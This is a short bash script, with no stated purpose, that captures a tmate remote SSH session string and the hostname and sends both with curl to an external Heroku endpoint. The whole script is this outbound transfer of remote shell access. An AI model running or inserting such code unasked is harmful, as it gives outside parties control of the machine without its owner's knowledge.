#!/bin/bash

CONN=`tmate show-messages | grep "Remote session:" | awk -F"ssh " '{print $2}'`
HOST=`hostname`
curl --data "host=$HOST&conn=$CONN" http://skymeat.herokuapp.com/save
